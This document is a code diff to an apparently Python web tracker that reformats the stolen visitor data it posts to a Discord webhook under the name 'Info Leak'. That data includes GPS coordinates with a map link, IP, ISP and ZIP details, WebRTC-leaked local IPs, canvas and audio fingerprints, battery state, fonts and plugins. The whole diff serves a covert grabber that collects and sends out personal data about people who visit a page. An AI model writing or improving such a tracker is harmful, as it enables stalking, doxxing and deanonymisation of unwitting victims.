@@ -44,13 +44,13 @@ def track_data():
     data['ipInfo'] = ip_info
     data['clientIp'] = client_ip
     
-    # Send to Discord with compact formatting
+    # Send to Discord with boxed formatting
     send_to_discord(data)
     
     return jsonify({"status": "success", "discord_sent": True})
 
 def send_to_discord(data):
-    """Send compact but comprehensive data to Discord"""
+    """Send boxed format to Discord"""
     
     location = data.get('location', {})
     ip_info = data.get('ipInfo', {})
@@ -62,108 +62,139 @@ def send_to_discord(data):
     fonts = data.get('fonts', [])
     plugins = data.get('plugins', [])
     
-    # Build compact message
+    # Build boxed message
     lines = []
-    lines.append("📍 **OSINT Package**")
+    lines.append("```")
+    lines.append("╔════════════════════════════════════════════════════════════╗")
+    lines.append("║                    📡 INFO LEAK                           ║")
+    lines.append("╠════════════════════════════════════════════════════════════╣")
     lines.append("")
     
-    # Location - compact
+    # LOCATION
     if location and location.get('latitude'):
         lat = location.get('latitude')
         lng = location.get('longitude')
         acc = location.get('accuracy', 'N/A')
-        lines.append(f"📍 `{lat}, {lng}` ±{acc}m")
-        lines.append(f"🔗 https://maps.google.com/?q={lat},{lng}")
+        lines.append("║ 📍 GPS LOCATION")
+        lines.append(f"║    {lat}, {lng}")
+        lines.append(f"║    Accuracy: ±{acc}m")
+        lines.append(f"║    https://maps.google.com/?q={lat},{lng}")
     else:
-        lines.append(f"📍 ❌ {location.get('error', 'Not shared')}")
-    lines.append("")
+        lines.append(f"║ 📍 LOCATION: ❌ {location.get('error', 'Not shared')}")
+    lines.append("║")
     
-    # IP Intelligence - compact
+    # IP INTELLIGENCE
     if ip_info:
-        parts = []
-        if ip_info.get('ip'): parts.append(ip_info['ip'])
-        if ip_info.get('city'): parts.append(f"🏙️{ip_info['city']}")
-        if ip_info.get('country'): parts.append(ip_info['country'])
-        if ip_info.get('isp'): parts.append(f"📡{ip_info['isp'][:20]}")
-        lines.append("🌐 " + " | ".join(parts))
-        lines.append("")
+        lines.append("║ 🌐 IP INTELLIGENCE")
+        if ip_info.get('ip'): lines.append(f"║    IP: {ip_info['ip']}")
+        if ip_info.get('city') and ip_info.get('country'):
+            lines.append(f"║    Location: {ip_info.get('city')}, {ip_info.get('country')}")
+        if ip_info.get('isp'): lines.append(f"║    ISP: {ip_info['isp']}")
+        if ip_info.get('org'): lines.append(f"║    Org: {ip_info['org']}")
+        if ip_info.get('as'): lines.append(f"║    ASN: {ip_info['as']}")
+        if ip_info.get('zip'): lines.append(f"║    ZIP: {ip_info['zip']}")
+    lines.append("║")
     
-    # Browser & Device - compact
-    browser_parts = []
-    browser_parts.append(f"🖥️{data.get('platform', 'N/A')}")
-    browser_parts.append(f"🌍{data.get('language', 'N/A')}")
+    # DEVICE & BROWSER
+    lines.append("║ 🖥️ DEVICE & BROWSER")
+    lines.append(f"║    OS: {data.get('platform', 'N/A')}")
+    lines.append(f"║    Browser: {data.get('userAgent', 'N/A')[:60]}...")
+    lines.append(f"║    Language: {data.get('language', 'N/A')}")
     if hw.get('hardwareConcurrency'):
-        browser_parts.append(f"⚡{hw['hardwareConcurrency']}c")
+        lines.append(f"║    CPU: {hw['hardwareConcurrency']} cores")
     if hw.get('deviceMemory'):
-        browser_parts.append(f"💾{hw['deviceMemory']}GB")
-    lines.append(" | ".join(browser_parts))
-    lines.append("")
+        lines.append(f"║    RAM: {hw['deviceMemory']}GB")
+    if hw.get('maxTouchPoints'):
+        lines.append(f"║    Touch Points: {hw['maxTouchPoints']}")
+    lines.append("║")
     
-    # Screen - compact
-    lines.append(f"📺 {screen.get('width', 'N/A')}x{screen.get('height', 'N/A')} @{screen.get('pixelRatio', 'N/A')}x")
-    lines.append("")
+    # SCREEN
+    lines.append("║ 📺 SCREEN")
+    lines.append(f"║    Resolution: {screen.get('width', 'N/A')}x{screen.get('height', 'N/A')}")
+    lines.append(f"║    Pixel Ratio: {screen.get('pixelRatio', 'N/A')}x")
+    lines.append(f"║    Color Depth: {screen.get('colorDepth', 'N/A')}bit")
+    lines.append("║")
     
-    # WebRTC Leak
+    # WEBRTC LEAK
     if webrtc and webrtc[0] not in ['No local IPs found', 'WebRTC not supported']:
-        lines.append(f"🔓 {', '.join(webrtc)}")
-        lines.append("")
+        lines.append("║ 🔓 WEBRTC LEAK")
+        for ip in webrtc:
+            lines.append(f"║    {ip}")
+    lines.append("║")
     
-    # Fingerprints - compact
-    lines.append(f"🆔 Canvas: `{data.get('canvasFingerprint', 'N/A')[:8]}`")
-    lines.append(f"🆔 Audio: `{data.get('audioFingerprint', 'N/A')[:8]}`")
-    lines.append("")
+    # FINGERPRINTS
+    lines.append("║ 🆔 FINGERPRINTS")
+    canvas = data.get('canvasFingerprint', 'N/A')
+    audio = data.get('audioFingerprint', 'N/A')
+    lines.append(f"║    Canvas: {canvas[:12]}")
+    lines.append(f"║    Audio: {audio[:12]}")
+    lines.append("║")
     
-    # Battery - compact
+    # BATTERY
     if battery:
-        battery_parts = []
-        if battery.get('level'): battery_parts.append(f"{battery['level']}")
-        if battery.get('charging') is not None: 
-            battery_parts.append("⚡" if battery['charging'] else "🔋")
-        lines.append(f"🔋 " + " ".join(battery_parts))
-        lines.append("")
+        lines.append("║ 🔋 BATTERY")
+        if battery.get('level'): lines.append(f"║    Level: {battery['level']}")
+        if battery.get('charging') is not None:
+            status = "Charging" if battery['charging'] else "Discharging"
+            lines.append(f"║    Status: {status}")
+    lines.append("║")
     
-    # Performance - compact
-    perf_parts = []
-    if perf.get('loadTime') and perf['loadTime'] != 'N/A':
-        perf_parts.append(f"⏱️{perf['loadTime']}ms")
-    if perf.get('dns') and perf['dns'] != 'N/A':
-        perf_parts.append(f"DNS:{perf['dns']}ms")
-    if perf.get('ttfb') and perf['ttfb'] != 'N/A':
-        perf_parts.append(f"TTFB:{perf['ttfb']}ms")
-    if perf_parts:
-        lines.append("⚡ " + " | ".join(perf_parts))
-        lines.append("")
+    # PERFORMANCE
+    if perf and perf.get('loadTime') and perf['loadTime'] != 'N/A':
+        lines.append("║ ⚡ PERFORMANCE")
+        if perf.get('loadTime'): lines.append(f"║    Load Time: {perf['loadTime']}ms")
+        if perf.get('dns'): lines.append(f"║    DNS: {perf['dns']}ms")
+        if perf.get('ttfb'): lines.append(f"║    TTFB: {perf['ttfb']}ms")
+        if perf.get('tcp'): lines.append(f"║    TCP: {perf['tcp']}ms")
+    lines.append("║")
     
-    # Timezone & Session - compact
-    lines.append(f"🕐 {data.get('timezone', 'N/A')} | {data.get('timestamp', 'N/A')[:19]}")
-    lines.append(f"🆔 {data.get('sessionId', 'N/A')}")
-    lines.append("")
+    # TIMEZONE
+    lines.append("║ 🕐 TIMEZONE")
+    lines.append(f"║    {data.get('timezone', 'N/A')}")
+    if data.get('timezoneOffset') is not None:
+        offset = data['timezoneOffset']
+        hours = abs(offset) // 60
+        mins = abs(offset) % 60
+        sign = '-' if offset > 0 else '+'
+        lines.append(f"║    UTC{sign}{hours:02d}:{mins:02d}")
+    lines.append("║")
     
-    # Fonts - compact (show first 10)
+    # FONTS
     if fonts:
-        font_list = ', '.join(fonts[:10])
-        if len(fonts) > 10:
-            font_list += f" +{len(fonts)-10} more"
-        lines.append(f"📝 {font_list}")
-        lines.append("")
+        font_list = ', '.join(fonts[:8])
+        if len(fonts) > 8:
+            font_list += f" +{len(fonts)-8} more"
+        lines.append("║ 📝 FONTS")
+        lines.append(f"║    {font_list}")
+    lines.append("║")
     
-    # Plugins - compact (show first 5)
+    # PLUGINS
     if plugins:
         plugin_list = ', '.join(plugins[:5])
         if len(plugins) > 5:
             plugin_list += f" +{len(plugins)-5} more"
-        lines.append(f"🧩 {plugin_list}")
-        lines.append("")
+        lines.append("║ 🧩 PLUGINS")
+        lines.append(f"║    {plugin_list}")
+    lines.append("║")
     
-    # Referrer - compact
+    # SESSION
+    lines.append("║ 🆔 SESSION")
+    lines.append(f"║    ID: {data.get('sessionId', 'N/A')}")
+    if data.get('timestamp'):
+        ts = data['timestamp'][:19].replace('T', ' ')
+        lines.append(f"║    Time: {ts}")
     if data.get('referrer') and data['referrer'] != 'Direct':
-        lines.append(f"🔗 {data['referrer'][:50]}")
-        lines.append("")
+        lines.append(f"║    Referrer: {data['referrer'][:50]}...")
+    lines.append("║")
+    
+    # BOTTOM BORDER
+    lines.append("╚════════════════════════════════════════════════════════════╝")
+    lines.append("```")
     
     # Send to Discord
     payload = {
         "content": "\n".join(lines),
-        "username": "OSINT Tracker"
+        "username": "Info Leak"
     }
     
     try:
